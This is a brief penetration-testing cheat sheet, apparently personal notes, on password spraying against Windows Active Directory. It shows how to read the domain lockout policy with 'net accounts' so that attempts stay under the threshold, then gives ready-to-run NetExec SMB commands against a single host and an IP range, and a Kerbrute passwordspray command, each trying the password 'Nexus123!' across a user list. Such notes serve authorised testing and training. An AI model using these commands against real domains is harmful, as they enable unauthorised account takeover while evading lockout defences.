# Initial Enumeration
Run the following command on a target if possible:
```batch
net accounts
```
This will give two important details:
* Lockout threshold (how many attempts before your locked out)
* Lockout observation window (how long your locked out for)

It is worth noting these values and adjusting password spraying attacks accordingly (i.e. do less password attempts than the lockout).
# SMB Password Spraying
Sprays user accounts with "Nexus123!" password
```bash
nxc smb $(ANY_DOMAIN_JOINED_MACHINE_IP) -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
Spray multiple targets at once:
```bash
nxc smb -t 192.168.182.70-76 -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
# TGT Password Spraying
https://github.com/ropnop/kerbrute

Kerbrute can be run on windows or linux. This example ruins on windows to spray usernames with the password "Nexus123!".
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
